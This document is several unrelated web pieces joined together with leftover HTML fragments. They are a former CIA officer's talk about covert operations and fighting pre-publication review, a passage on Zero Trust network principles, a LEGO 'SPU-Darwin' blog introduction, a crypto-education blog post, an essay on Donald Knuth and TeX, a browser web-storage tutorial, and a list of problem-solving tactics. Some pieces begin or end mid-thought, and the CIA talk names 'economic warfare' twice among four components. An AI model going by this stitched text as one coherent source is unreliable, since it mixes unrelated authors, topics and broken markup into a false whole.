<p>Well, I served in the Agency for 25 years. The first 15 or 16 years, I believed that the CIA was sort of like a missionary organization, out saving the world for democracy and religion and gathering good intelligence to help our policymakers make good decisions. When I'd go into work in the morning, I'd feel a real pride that I'm part of the great crusade to stop the international communist conspiracy. All that began to change for me in Vietnam. That's when I began protesting.</p> 
 
<p>I should mention that I served my entire 25 years in the Directorate of Operations. Now, the Agency is broken down to basically four directorates, Administration, Science and Technology, Intelligence, and Operations. Administrators administrate. Science and Technology, they devise the sophisticated collection devices and monitor the results. The Directorate of Intelligence, that's the scholars who sit and read the reports that come in from around the world and then put out the final reports. And the Operators operate. The Directorate of Operations has two basic functions, covert operations and gathering intelligence covertly.</p> 
 
<p>Since it's my contention that the Agency is little more than a covert action agency, I will dwell a little bit on it. Now, covert action operations in broadest context can be described as those operations designed to overthrow or support foreign governments. Overthrow operations have four basic components, economic warfare, political warfare, psychological warfare, and economic warfare. In my 25 years in the Agency, I served overseas in Japan, in the Philippines, in Taiwan, six years or three tours in Thailand, and two years as the chief police adviser to the head of the Vietnamese Special Police. That's the equivalent of our FBI.</p> 
 
<p>As I said, my period of protests began around the Vietnam War. I for the next period within the Agency began protesting, and having no luck with those protests, I finally left the Agency in 1977. Now, in a stroke of real irony at this particular point, because they had assigned me to the CIA’s Siberia. When you escalate your protest, you become persona non grata. In '77 in a stroke of irony, they awarded me the Career Intelligence Medal and the Honorable Service Medal. Of course, I think I know why. They knew they had a loose cannon and they wanted to kind of damp me down, appease me a little bit. And I think that was the purpose of giving them to me.</p> 
 
<p>But I also earlier had won awards, two Vietnam service awards, a commendation from the director for devising a program of counterinsurgency and intelligence, and a variety of other CIA and foreign awards. Well, when I left the Agency, I testified before the Senate and House intelligence committees and before a variety of other Senate and House committees, all related to CIA activities.</p> 
 
<p>I immediately set about writing a book about my experiences. It took me three years to research and write the book, and then like all CIA officers, when you join the Agency, you have to sign a secrecy agreement. And as I said, I must now submit everything to the CIA for pre-publication review. I did, and they came back and they said they have identified approximately 400 security violations in my manuscript. And they returned it in little bits and pieces of paper, because some of these deletions ran up to several pages in length.</p> 
 
<p>Well, to defeat this process, I went through going through the public record and pulling out the identical information. And ultimately with this effort, I got virtually everything reinstated. There are a few little specifics that I didn't get reinstated, but for the most part they were all reinstated. I did in a few cases, they had deleted some very boring information, so I said rather than fight them over this one, let's just leave this comment, "Seven words deleted." It looks a lot sexier than mine. So I didn't fight them on all of them.</p> 
 
<p>Then I went looking for a publisher, a long hard process, and finally one publisher said, "You know, you've written a nice legal brief here. You make your points and then you have your citations to your information. But boy, it's dull as mud. Who would want to read a legal brief? So we will publish it if you'll rewrite it as a autobiography," which I did. I then resubmitted it to the CIA for pre-publication review. I didn't put any more secret details in there. I just added my personal life.</p> 
 
<p>At this time, William Casey had become Director of the CIA, and they in essence told me, "We're not going to let you publish a book." And I said, "Well, you can't stop me. Everything that's in the book, you have not only cleared for other people, it's not only in the public record, but you also cleared for me before. And the laws that you operate under say you may not reclassify information once it's been declassified and released." And their response in essence, "Well, that's tough. We're doing it anyhow. There's nothing you can do about it." Well, this was a very critical period. I just didn't know what to do. I really worried about this, because if they would've stopped me with that, then I would not be able to speak to you here this evening, because everything would have been classified.</p> 
 
<p>So I called <i>The Washington Post</i>, and <i>The Washington Post</i> ran a long exposé of how the CIA was violating the law by reclassifying information that was in the public domain, a violation of the law of the land. This public exposure forced the Agency to relent, and the book was finally released. Subsequent to the release of the book, I then traveled to Cuba, where we stayed about a week, and to Grenada, …</p></div></div>

This is different from a traditional security model where all components inside of a given perimeter are regarded as safe or trusted. It was introduced as a reaction to the traditional network security model as a measure against lateral movement after a breach.</p>
</section><article><section><p>In <a href="https://www.oreilly.com/library/view/zero-trust-networks/9781491962183/ch01.html">Zero Trust Networks by Evan Gilman, Doug Barth</a>, a Zero Trust network is defined as a network built on five fundamental assertions:</p>
<ol>
<li>The network is always assumed to be hostile</li>
<li>External and internal threats exist on the network at all times</li>
<li>Network locality is not sufficient for deciding trust in a network</li>
<li>Every device, user, and network flow is authenticated and authorized</li>
<li>Policies must be dynamic and calculated from as many sources of data as possible</li>
</ol>
<p>The core of Zero Trust is to "never trust, always verify", closely related to the principle of least privilege, stating that any user, program, or process should have the bare minimum privileges necessary to perform its tasks. In order to make sure that an application works well in a Zero Trust environment, we need to minimize the risk of lateral movement by isolating potential data breaches as much as possible. In the context of application development, these five assertions can be summarized into the following guidelines:</p>
<ol>
<li>Treat all hosts as if they are Internet-facing (assertions 1-3)</li>
<li>Delegate authentication and authorization to a supporting system (assertions 4-5)</li>
</ol>
<p>Given that all hosts are regarded as Internet-facing, we need to ensure that all communication channels are secure, even if they were at some point regarded as internal. This means that we should encrypt all internal and external network traffic that we don't want to expose, including (but not limited to) traffic between applications and databases. This will make it difficult for an attacker to snoop traffic, even if he or she has gained access to an internal network.</p>
<p>By delegating authentication and authorization to a supporting system (control plane), it is possible to enable centralized access auditing and policy enforcement based on selected criteria. This means that we don't need to create complex logic to verify devices and users in each application as it will be handled by the control plane. In a more practical sense, we should opt for federated identity combined with standardized authorization protocols like <a href="https://oauth.net/2/">OAuth 2.0</a>. In modern web applications, it may be worth looking into <a href="https://jwt.io/">JWT</a> to represent claims securely.</p>
<p>Regardless of which authorization method you choose, make sure that each client that is granted access will be given its own account. Never share credentials between services or users. One account per client makes it possible to remove access if one client is compromised, and makes it possible to trace traffic back to a single source when investigating an incident, or analyzing traffic in general.</p>
<blockquote>
<p>There are no Zero Trust products. There are products that work well in Zero Trust environments and those that don't.
— <a href="https://www.paloaltonetworks.com/cyberpedia/what-is-a-zero-trust-architecture">Palo Alto Networks</a></p>
</blockquote>
<p>That should cover the basics. If you would like to dive deeper into the subject, I highly recommend <a href="https://www.oreilly.com/library/view/zero-trust-networks/9781491962183/ch01.html">Zero Trust Networks by Evan Gilman, Doug Barth</a>.</p></section></article></div></article><section><ul><li></li><li></li></ul></section></main></div></div>]]>

			<p>In 1995 LEGO conducted a study to determine how to become “digital” – how to do it and what it would take. This study took place from May to October in a secret lab on the third floor of LEGO&nbsp;headquarters, Legocentret. At the end of the study LEGO&nbsp;management received a report detailing programs, people, and resources needed to move into the new paradigm. LEGO&nbsp;quickly approved the plan, and SPU-Darwin was set in motion at the beginning of the new year.</p>
<p>This website is the story of SPU-Darwin, of moving LEGO&nbsp;into the 21st century. I’m not sure yet how to tell that story, so it’s organized as a blog. This will allow me to present pieces of history as they come, without worrying about having to have everything set before presenting anything, and will allow me to experiment with presentations. Also, a great deal of leading edge science and engineering had to be developed, and those stories will require intense technical material, which might not appeal to everyone, and those entries will be separate from the general ones.</p>
<p><img alt="BKGND A" src="http://www.digitallego.net/wp-content/uploads/2013/05/BKGND-A-300x225.png" width="300" height="225" srcset="http://www.digitallego.net/wp-content/uploads/2013/05/BKGND-A-300x225.png 300w, http://www.digitallego.net/wp-content/uploads/2013/05/BKGND-A.png 320w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p>To Darwin members: the blog structure of this website is expressly designed to allow everyone to chime in with their memories. Please do that. Periodically I’ll go through the topics and concentrate them down into organized stories. It’s my hope that this path will eventually lead to an actual publication someday, like an interactive multimedia book, but we’ll worry about that later.</p>
<p>I’m not a designer, so if you’d like to contribute anything about this website design, PLEASE do so.</p>
<p>Note: only Darwin members (which is not just LEGO employees, it’s everyone who was intimately involved – this means you, SGI and Informix and DDE) will have editing access. Everyone else can email, which will be dealt with separately.</p>

<p>The main issue here, as you can see is that this code has a significant performance impact during the call the method. Dynamic attributes are expected to be fast and simple. They shouldn’t contain any complicated logic or perform expensive calls.  </p>

<p>Over the past couple months I’ve taken time to catch myself up on all that’s happened in crypto since my time with <a rel="noreferrer noopener" href="https://onwardlabs.co/" target="_blank"><strong>Onward Labs</strong></a>, and all I can say is my goodness – the amount of experimentation and innovation has been staggering this year. This is exciting because we are seeing financial services get completely rebuilt in an internet-native way and artists are now able to make a good living creating beautiful NFTs. I’m more optimistic about the future of society because of crypto and this decade will be wild with all the mass consumer use cases that will be built.</p>



<p>At the same time, I’m concerned that the barriers to engage with crypto are higher than ever before. This is a huge problem because it limits the circle of people “in the know” to those who lucked into crypto early as well as their extended networks. It’s no secret that Silicon Valley has had a diversity problem and by comparison crypto’s diversity problem is much worse. If we want crypto to achieve the enormous potential we believe crypto has, we have to make the ecosystem more welcoming and inviting for people from all walks of life who bring their unique lived experiences with them. Then, and only then, will the conditions be set to fulfill crypto’s promise to empower people.</p>



<p>I remember when I was first learning about crypto in 2017 – what a steep learning curve it has been! In fact, every crypto expert – whether the like to admit it or not – went through a steep learning curve and we are all still learning. Now that the next crypto bull run is in full swing, I can’t help but think of the massive learning curve that the influx of newcomers to the space will face. </p>

<p>Back when I was preparing for a career in finance, I recall learning about the basics of finance on Investopedia and how great of a resource it was. I thought to myself – why isn’t there something like this for crypto? Enter <a rel="noreferrer noopener" href="https://cryptoporfavor.com/" target="_blank"><strong>Crypto Por Favor</strong></a>. I am building a platform that explains crypto topics in everyday language, meeting people where they are and not using complex crypto jargon as the industry is wont to do. I want it to be a place where anyone can come in from a crypto knowledge base of zero and build up enough awareness to be able to make well-informed decisions about how the want to participate in the evolving ecosystem. I see this as a resource for people, and over time will look to build a community of folks who want to learn among supportive peers in a place where no question is “too dumb.” Oh, and maybe I will experiment with a community token down the road to incentivize people to help build the best crypto onboarding community!</p>



<p>Would love to hear what you think as well as any requests for topics you’d like covered or features you’d like to see. Feel free to reach out on <a rel="noreferrer noopener" href="https://twitter.com/chris3collins" target="_blank"><strong>Twitter</strong></a>.</p>



<p>PS – you may be wondering about the rationale behind the name and branding. When I chose the name, I wanted it to evoke a sense of multiculturalism and present a casual, non-intimidating tone. Given my Latin American roots, Crypto Por Favor was a no-brainer as well as its llama mascot, an animal that is typical of the Andes region. 🦙🌄</p>

<hr>

<p>Most serious programmers have heard of Donald Knuth,
the man who coined the term <em>analysis of algorithms</em> in 1968
and pioneered many of the computer science fundamentals we use today.
Knuth is perhaps most famous for his ongoing magnum opus,
<em>The Art of Computer Programming</em>.</p>

<p>When the first volume of TAOCP was released that same year,
it was printed the way most books had been since the turn of the century:
with <em>hot metal</em> type.
Each individual letter was cast from molten lead,
then arranged into its line.</p>

<figure>
<img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Matrixcase-bembo-16pts.jpg" alt="Monotype matrix case" height="400">
<figcaption>
A case of letter molds—or <em>matrices</em>—used by the Monotype caster,
the most commonly-used machine for printing books in the days of hot metal type.
Its main contemporary, the Linotype, molded entire lines at a time,
and was often used for printing newspapers.
</figcaption>
</figure>

<p>These lines were clamped together to form pages of the book,
which were finally inked and pressed against paper.
By March of 1977, Knuth was ready for a second run of TAOCP, Volume&nbsp;2,
but he was horrified when he received the proofs.
Hot metal typesetting was an expensive, complicated, and time-consuming process,
so publishers had replaced it with phototypesetting,
which works by projecting characters onto film.
The new technology, while much cheaper and faster,
didn’t provide the same level of quality he had come to expect.</p>

<p>The average author would have resigned themselves to the change and moved on,
but Knuth took great pride in print quality,
especially for the mathematics in his books.
Around this time, he discovered an exciting new technology:
digital typesetting.
Instead of working with metal or film,
letters and shapes were built from tiny dots,
often packed together at over 1,000 per inch.
Inspired by this burgeoning tech and frustrated with the current state of affairs,
Knuth set off on one of the greatest yak shaves of all time.
For years, he paused all work on his books to create his own
digital typesetting system.
When the dust settled in 1978, Knuth had the first version of
<span>T<sub>e</sub>X</span>
.<sup id="fnref:1"><a href="#fn:1">1</a></sup></p>

<p>It’s hard to understand how much of a revolution <span>T<sub>e</sub>X</span>
 was,
especially looking back from a time where anybody with a copy
of Word can be their own desktop publisher.
Adobe’s PDF wouldn’t exist for another decade, so Knuth
invented a device-independent format, DVI.
Scalable fonts were uncommon at the time, so Knuth created a system,
<span>METAFONT</span>
, to rasterize his characters into dots on the
page.<sup id="fnref:2"><a href="#fn:2">2</a></sup>
Perhaps most importantly, Knuth and his graduate students designed algorithms
to automatically hyphenate and justify lines of text into
beautifully-typeset paragraphs.</p>

<p>Here is where the timelines diverge.
In one, <span>T<sub>e</sub>X</span>
 was just the beginning.
Computer typography evolves rapidly as the decades go by,
building on Knuth’s prior work and
taking advantage of the million-fold increases we’ve seen in computing power.
Browsers, e-readers, and word processors deliver beautiful type
to every person who looks at a screen, with almost no effort from authors.</p>

<p>In the darker timeline… none of this happens.
<span>T<sub>e</sub>X</span>
 is still some of the best we’ve got for computer typesetting.
It’s seen some impressive improvements,<sup id="fnref:3"><a href="#fn:3">3</a></sup>
but its core hasn’t changed much in decades.
To this day,
it doesn’t lay out more than one page at a time because 1980s computers didn’t
have enough RAM to do any better.<sup id="fnref:4"><a href="#fn:4">4</a></sup>
Almost no other software—except for a handful of professional layout
programs like Adobe InDesign—leverages any of the advances
<span>T<sub>e</sub>X</span>
 made in line breaking and hyphenation.
Layout in Word, browsers, and even e-readers is a sad joke.</p>

<figcaption>
State of the art text layout in today's browsers. Mind the gaps.
</figcaption>
</figure>

<p>I’m not sure what to make of this.
Maybe most people, outside a small cadre of designers and
enthusiasts, just don’t care about typography very much.
After all, the human brain is incredibly good glossing over minor details and
im<span>p</span>erfections when reading.
But even the design world seems largely unaware or indifferent to Knuth’s work.
Despite collaborations with famous type designers like Hermann Zapf,
you’ll find no mention of him in renowned books and documentaries on
the subject.<sup id="fnref:5"><a href="#fn:5">5</a></sup>
And parametric font families—just like the ones <span>METAFONT</span>
 offered in 1983—are
heralded in 2017 as “a new era of type design”.<sup id="fnref:6"><a href="#fn:6">6</a></sup>
It’s bizarre.</p>

<p>Good typography can make almost anything more enjoyable to read,
and it feels like such a shame that better layout isn’t
available to the masses
when so much of the groundwork was laid almost forty years ago.
In an age when the average American reads from a screen they keep in their pocket
dozens of times a day,
and where each one of those devices holds more processing power than you could
fit in several rooms back when Donald Knuth
wrote <span>T<sub>e</sub>X</span>
, surely we can—and <em>should</em>—do better.</p>

December 6, 2020 | https://attacomsian.com/blog/web-storage-api-local-storage-session-storage | <a href="https://web.archive.org/web/*/https://attacomsian.com/blog/web-storage-api-local-storage-session-storage">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>The HTML web storage API provides a way to store data locally within a user's browser. You can use it to securely store a large amount of data locally without impacting website performance.</p>
<p>Unlike cookies, web storage has a significantly higher storage limit (5MB vs 4KB) and the data stored is never sent to the server with every request. Therefore, the server can not manipulate the web storage data via HTTP cookies.</p>
<p>Also, the storage is bound to the origin (per domain, protocol, and port). All web pages, from one origin (with the same protocol, domain, and port), can store and access the same data. Even if you change the protocol from <code>http</code> to <code>https</code>, you can not access the data stored using the <code>http</code> protocol.</p>
<h2 id="web-storage-objects">Web Storage Objects</h2>
<p>HTML web storage provides two objects for saving data as key-value pairs in the browser:</p>
<ul>
<li><code>localStorage</code> — stores data with no expiration date that persists even after the browser window is closed. You have to explicitly remove data either programmatically or by clearing the browser's data. The data is shared among all the sessions of the same origin.</li>
<li><code>sessionStorage</code> — stores data for the duration of the page session that gets cleared automatically when the browser tab is closed. If you open multiple tabs of the same website, they will have different sessions and can not access data of each other.</li>
</ul>
<p>Since <code>localStorage</code> persists data with no expiration date, it is useful for storing information such as shopping cart items, user preferences (currency, dark or light color scheme), products bookmarked, or even remembering the user is logged into the website.</p>
<h2 id="methods--properties">Methods &amp; Properties</h2>
<p>Both <code>localStorage</code> and <code>sessionStorage</code> objects provide the same methods and properties because they return the same <a href="https://developer.mozilla.org/en-US/docs/Web/API/Storage" target="_blank" rel="noopener noreferrer" title="Open in new window">Storage</a> object.</p>
<p>The <code>Storage</code> object has just one property, <code>length</code>, that returns the number of items stored in it.</p>
<p>Here is a list of methods that you can call to manipulate web storage data:</p>
<table>
<thead>
<tr>
<th>Method</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>setItem(key, value)</code></td>
<td>Add a new key-value pair to the storage</td>
</tr>
<tr>
<td><code>getItem(key)</code></td>
<td>Retrieve a value by its key</td>
</tr>
<tr>
<td><code>removeItem(key)</code></td>
<td>Remove an item by its key</td>
</tr>
<tr>
<td><code>clear()</code></td>
<td>Delete all key-value pairs</td>
</tr>
<tr>
<td><code>key(n)</code></td>
<td>Retrieve the name of the nth key in the storage</td>
</tr>
</tbody>
</table>
<h2 id="web-storage-examples">Web Storage Examples</h2>
<p>Let us play with <code>localStorage</code> to get an idea of how web storage works.</p>
<h3 id="storing-data">Storing data</h3>
<p>The following example uses <code>setItem()</code> to add new key-value pairs to <code>localStorage</code>:</p>
<pre rel="javascript"><code>localStorage.setItem('id', 'ATS-456');
localStorage.setItem('email', 'john.doe@example.com');
</code></pre>
<p>Note that both key and value passed to <code>setItem()</code> must be strings. If you pass any value that is not a string, like an object or a number, the <code>setItem()</code> method will automatically convert it a string:</p>
<pre rel="javascript"><code>localStorage.setItem('visitors', 34); // stored as '34'
localStorage.setItem('user', { name: 'Alex' }); // stored as '[oject Object]'
</code></pre>
<p>For objects, you need to use the <a href="https://attacomsian.com/blog/json-parse-stringify#jsonstringify">JSON.stringify()</a> method to convert it to a string before storing into web storage:</p>
<pre rel="javascript"><code>const str = JSON.stringify({name: 'Alex'});
localStorage.setItem('user', str);
</code></pre>
<h3 id="retrieving-data">Retrieving data</h3>
<p>To retrieve the stored data in <code>localStorage</code> by key, use the <code>getItem()</code> method:</p>
<pre rel="javascript"><code>localStorage.getItem('id');     // ATS-456
localStorage.getItem('email');  // john.doe@example.com
</code></pre>
<p>Alternatively, you could also use the dot (<code>.</code>) donation to access keys from <code>localStorage</code> like objects:</p>
<pre rel="javascript"><code>localStorage.visitors;  // 45
</code></pre>
<p>If the key doesn't exist, a <code>null</code> value is returned by <code>getItem()</code>:</p>
<pre rel="javascript"><code>localStorage.getItem('name'); // null
</code></pre>
<h3 id="removing-data">Removing data</h3>
<p>To delete a key-value pair from <code>localStorage</code>, just pass the name of the key to the <code>removeItem()</code> method:</p>
<pre rel="javascript"><code>localStorage.removeItem('id');
</code></pre>
<p>Alternatively, you could also use the <code>delete</code> operator to delete a key like an object:</p>
<pre rel="javascript"><code>delete localStorage.email;
</code></pre>
<p>To remove all key-value pairs, use the <code>clear()</code> method instead:</p>
<pre rel="javascript"><code>localStorage.clear();
</code></pre>
<h3 id="iterating-over-keys">Iterating over keys</h3>
<p>To iterate over all keys stored in <code>localStorage</code>, we can use the <a href="https://attacomsian.com/blog/javascript-for-of-loop">for...of</a> loop:</p>
<pre rel="javascript"><code>const keys = Object.keys(localStorage);
for (let key of keys) {
    console.log(`${key}: ${localStorage.getItem(key)}`);
}
</code></pre>
<p>The <code>Object.keys()</code> method returns all <a href="https://attacomsian.com/blog/javascript-object-get-all-own-properties">own properties</a> of the <code>localStorage</code> object, ignoring the <a href="https://attacomsian.com/blog/objects-prototypes-classes-javascript#prototypes">prototype</a>.</p>
<h2 id="summary">Summary</h2>
<p>HTML web storage API provides a mechanism to store data locally within the user's browser. Before web storage, cookies were the only option available for storing application data.</p>
<p>Unlike cookies, web storage is more secure and capable of storing a larger amount of data (5MB+, depending on the browser) without affecting the application performance.</p>
<p>Web storage is bound to the origin, which means that pages from the same origin can only access their own data.</p>
<p>Web storage provides two objects, <code>localStorage</code> and <code>sessionStorage</code>, to save data as key-value pairs in the browser.</p>
<p>The data stored in <code>localStorage</code> is permanent and shared between all tabs and windows with the same origin. It persists even after the browser is closed or the computer is restarted.</p>
<p>The <code>sessionStorage</code> object stores data temporarily until the session is active. The data is only accessible within the same tab and can not be accessed from other tabs. It gets cleared automatically once the browser tab is closed.</p>

<p>Sunday December 6, 2020</p>
<p>Inspired by <a href="https://planspace.org/2013/09/28/polyas-how-to-solve-it-quotes-and-comments/">How to Solve It</a>, <a href="https://planspace.org/20200716-lateral_thinking_creativity_step_by_step/">Lateral Thinking</a>, and others,
I've started to collect tactics for problem-solving. The shuffling
stuff is so that you can easily choose a random tactic to try.</p>
<p>I might do more with this and I'd love feedback/suggestions;
<a href="#contact">comment or message me</a>!</p>
<center>


</center>

<div>
<hr>
<h3><a href="#1" name="1">1</a>. Embrace problems</h3>
<p>The word "problem" has a negative connotation, and some problems are
hard to love. But in general, problems make life more interesting and
give us opportunities to learn, grow, and improve. Keep your problems
close.</p>
</div>
<div>
<hr>
<h3><a href="#2" name="2">2</a>. Take care of yourself</h3>
<p>Are you hungry? Tired? Stressed? Eat well, sleep well, and look after
your mental health. Try to do something right now to make your body
and mind more effective, like stretching.</p>
</div>
<div>
<hr>
<h3><a href="#3" name="3">3</a>. Take the pressure off</h3>
<p>What can you do to approach the problem calmly? Should you ask for
help or otherwise communicate with others? Should you make a back-up
plan or adjust your goal?</p>
</div>
<div>
<hr>
<h3><a href="#4" name="4">4</a>. Reinforce the positive</h3>
<p>You have an opportunity for growth. You're learning. Celebrate all
progress, even small progress. Feel good about what you're doing. You
can do this.</p>
</div>
<div>
<hr>
<h3><a href="#5" name="5">5</a>. Remove distractions</h3>
<p>Turn off the TV. Turn off your phone. Turn off notifications. Don't
check the news. Multitasking is a lie. If other thoughts come, jot
them down elsewhere to return to later.</p>
</div>
<div>
<hr>
<h3><a href="#6" name="6">6</a>. Get inspired</h3>
<p>Why are you working on this? What's the larger goal? What are the
larger benefits? What other problems or people have done work you
admire? Appreciate and aspire to greatness.</p>
</div>
<div>
<hr>
<h3><a href="#7" name="7">7</a>. Make a plan</h3>
<p>If you know how to attack the problem, make a plan to do that. Even if
you don't, make a plan to spend time on the problem, not all at once,
but consistently over a longer period.</p>
</div>
<div>
<hr>
<h3><a href="#8" name="8">8</a>. Do other things</h3>
<p>Don't forget to eat and sleep, but also, spend time on complementary
and even unrelated tasks. Read a book. Tutor a student. Revisit other
things. Take a walk.</p>
</div>
<div>
<hr>
<h3><a href="#9" name="9">9</a>. Work hard</h3>
<p>You need to focus. You need to put in time and effort. Sometimes you
have to stop looking for shortcuts and do the work. There is no royal
road. Work harder than anyone else.</p>
</div>
<div>
<hr>
<h3><a href="#10" name="10">10</a>. Relax</h3>
<p>Take some time to change the nature of your focus on the problem. Pull
back from single-minded concentration. Don't focus on anything else
either. Relax. Don't micromanage your brain. What comes to you?</p>
</div>
<div>
<hr>
<h3><a href="#11" name="11">11</a>. Work smart</h3>
<p>Even if you're already making progress, is there something you could
do more effectively? Can you find a better process if you reconsider?</p>
</div>
<div>
<hr>
<h3><a href="#12" name="12">12</a>. Find support</h3>
<p>What would help you to be effective? Is there a group or team you can
join or form? What people or other resources can you engage with?</p>
</div>
<div>
<hr>
<h3><a href="#13" name="13">13</a>. Understand the problem</h3>
<p>Do you completely understand what you're working on? Are all the
definitions clear? Does everyone involved agree on the problem
statement and objective?</p>
</div>
<div>
<hr>
<h3><a href="#14" name="14">14</a>. Find roots</h3>
<p>What is the root cause (or causes) of the problem? Is the problem as
stated the real problem? How did the problem come to be? Keep asking
why.</p>
</div>
<div>
<hr>
<h3><a href="#15" name="15">15</a>. Know what you know</h3>
<p>What do you know, and how do you know it? Are you sure? Could you
explain it to someone else? What do you not know, and how could you
come to know it? What else might be relevant?</p>
</div>
<div>
<hr>
<h3><a href="#16" name="16">16</a>. Question assumptions</h3>
<p>What are you taking for granted? What is so obvius that you haven't
thought about it? What biases might be affecting your thinking? Are
there alternatives that seem "out there"?</p>
</div>
<div>
<hr>
<h3><a href="#17" name="17">17</a>. Find similar problems</h3>
<p>Do you know a related problem? What have others done in similar
situations? How is a similar problem solved in nature, or in another
field? Can you build on work you or others have done before?</p>
</div>
<div>
<hr>
<h3><a href="#18" name="18">18</a>. Consider quitting</h3>
<p>Is this a problem that shouldn't be solved? Is this problem the right
use of your time, right now? What if you didn't solve this particular
problem?</p>
</div>
<div>
<hr>
<h3><a href="#19" name="19">19</a>. Get an easy win</h3>
<p>Find a task that you can succeed at in the next two minutes. It could
be getting out a pen, or opening a book. Do it, then praise yourself
for that victory. It may be easier to keep making progress afterward.</p>
</div>
<div>
<hr>
<h3><a href="#20" name="20">20</a>. Start things cooking</h3>
<p>Many tasks involve some waiting after you initiate them, like waiting
for food to marinate, or waiting for responses to an email. Make a
point to get these things started as soon as you can.</p>
</div>
<div>
<hr>
<h3><a href="#21" name="21">21</a>. Take a step</h3>
<p>Even if you're not sure of your whole plan, do something now. You can
always reevaluate afterward. Choose some goal that you can accomplish,
and do it now.</p>
</div>
<div>
<hr>
<h3><a href="#22" name="22">22</a>. Do an experiment</h3>
<p>You don't have to only do things that you know will work. Try
something and see what happens. Be prepared to throw it away. You'll
learn from it and it will help you to make progress.</p>
</div>
<div>
<hr>
<h3><a href="#23" name="23">23</a>. Guess and check</h3>
<p>A particular kind of experiment is to choose a next step, even if you
don't know that it's right, and see what happens next. Follow the
consequences forward. Even if you guessed wrong, you'll learn
something.</p>
</div>
<div>
<hr>
<h3><a href="#24" name="24">24</a>. Write down what you’ve done</h3>
<p>Keep some log of what you've been doing, what you've tried, and what
the results have been. If you haven't been doing this, try to remember
and write down what you've done so far.</p>
</div>
<div>
<hr>
<h3><a href="#25" name="25">25</a>. Try again</h3>
<p>Sometimes when you try something and it doesn't work, it isn't that
the approach was bad, it's that something didn't align that time. It
could be worth trying again, especially with things you tried when you
knew less.</p>
</div>
<div>
<hr>
<h3><a href="#26" name="26">26</a>. Zoom in</h3>
<p>How close can you get to the tiniest pieces? What happens for exactly
one component? For a global problem, how does a single individual play
a part on a daily basis?</p>
</div>
<div>
<hr>
<h3><a href="#27" name="27">27</a>. Zoom out</h3>
<p>What's the big picture? How does the problem fit into larger systems?
What's the global view? What's the long term view?</p>
</div>
<div>
<hr>
<h3><a href="#28" name="28">28</a>. Draw a picture</h3>
<p>Make a graphical representation. It could be a sketch, a plot, a
diagram, a mind map, a flow chart. Make something you can see.</p>
</div>
<div>
<hr>
<h3><a href="#29" name="29">29</a>. Change representations</h3>
<p>What's another way to conceptualize the problem? In math, you might
switch between numeric, geometric, and algebraic forms. You might
change domains, or phrase the problem as a story.</p>
</div>
<div>
<hr>
<h3><a href="#30" name="30">30</a>. Use a different tool</h3>
<p>Try saying it out loud. Try typing, or writing longhand, or recording
a video. Try post-it notes or index cards. Try paper and pencil, or a
calculator, a diagramming tool, or a programming language.</p>
</div>
<div>
<hr>
<h3><a href="#31" name="31">31</a>. Use analogy</h3>
<p>What else is this like? Can you compare to something else, even if
it's a stretch? What do the similarities and differences tell you?</p>
</div>
<div>
<hr>
<h3><a href="#32" name="32">32</a>. Change viewpoints</h3>
<p>How does this look from different perspectives? How do different
people, pieces, places see the problem? Can you imagine yourself in
different positions?</p>
</div>
<div>
<hr>
<h3><a href="#33" name="33">33</a>. Organize concepts</h3>
<p>What's the deep structure of this problem? Can you model the problem?
Are there axes or other ways of representing the ideas of your
problem?</p>
</div>
<div>
<hr>
<h3><a href="#34" name="34">34</a>. Add randomness</h3>
<p>Consider something you wouldn't otherwise: a random word, WikiPedia
article, or the concept of randomness itself. Go to a museum, or a
store. Whatever you find, relate it to your problem. What could it
mean?</p>
</div>
<div>
<hr>
<h3><a href="#35" name="35">35</a>. Talk it through</h3>
<p>Have a conversation with someone. Or imagine a conversation with
someone. Or have a conversation with yourself. Explain everything
you're thinking about.</p>
</div>
<div>
<hr>
<h3><a href="#36" name="36">36</a>. Decompose/Recompose</h3>
<p>What are the words and ideas that you're using? Are they cliché? Are
they appropriate? What if you broke down the way you're understanding
the problem and rebuilt it? Can you articulate the problem and
solution spaces?</p>
</div>
<div>
<hr>
<h3><a href="#37" name="37">37</a>. Get feedback</h3>
<p>Get an outside view on your problem and your work on it. Try to
solicit feedback that helps you see things you aren't otherwise
seeing.</p>
</div>
<div>
<hr>
<h3><a href="#38" name="38">38</a>. Learn more</h3>
<p>You may not know enough to solve your problem, and you may not even
know what it is that you don't know. Keep learning! Be curious about
topics near and far. Read and study for pleasure.</p>
</div>
<div>
<hr>
<h3><a href="#39" name="39">39</a>. Ask for help</h3>
<p>Other people can help you a lot. Put effort into finding the right
place and way to ask, and others will often put effort into helping
you.</p>
</div>
<div>
<hr>
<h3><a href="#40" name="40">40</a>. Break it up</h3>
<p>Sometimes you can break big problems into many more manageable steps.
It may even be possible for multiple people to work on separate parts.
Regardless, pursue and celebrate partial progress.</p>
</div>
<div>
<hr>
<h3><a href="#41" name="41">41</a>. Use inversion</h3>
<p>How might you achieve the opposite of your goal? Are there other
reversals or inversions that might be illuminating? What's the worst
case outcome? Can you avoid it?</p>
</div>
<div>
<hr>
<h3><a href="#42" name="42">42</a>. Make a list</h3>
<p>Generate lots of ideas. What are all the options? Consider more
possibilities. What else could you make a list of?</p>
</div>
<div>
<hr>
<h3><a href="#43" name="43">43</a>. Eliminate possibilities</h3>
<p>What can you rule out? What hasn't worked already? What's impossible?
What has to be wrong? Why is that? What are the constraints? What can
you learn from what doesn't work?</p>
</div>
<div>
<hr>
<h3><a href="#44" name="44">44</a>. Work backward</h3>
<p>Assume you have a solution. How would it come to be? What would
immediately lead to it? Can you follow steps backward from the end?</p>
</div>
<div>
<hr>
<h3><a href="#45" name="45">45</a>. Consider special cases</h3>
<p>Are there some specific forms of the problem that are more tractable
or help with understanding? Can you extend a method based on these?</p>
</div>
<div>
<hr>
<h3><a href="#46" name="46">46</a>. Consider extremes</h3>
<p>What if something in your problem disappeared, or was huge? What if
the problem itself was much worse, or more minor?</p>
</div>
<div>
<hr>
<h3><a href="#47" name="47">47</a>. Add a constraint</h3>
<p>Add a deadline for something. Can you come up with ten ideas in ten
minutes? What if you have to be done today? What if your techniques or
resources were limited? What if you couldn't use a tool you're
currently using?</p>
</div>
<div>
<hr>
<h3><a href="#48" name="48">48</a>. Simplify</h3>
<p>In what ways could a complicated problem be made less so? What does
simplifying it mean? Can you solve the simpler problem? If so, is that
good enough, or is there a way to build on the solution?</p>
</div>
<div>

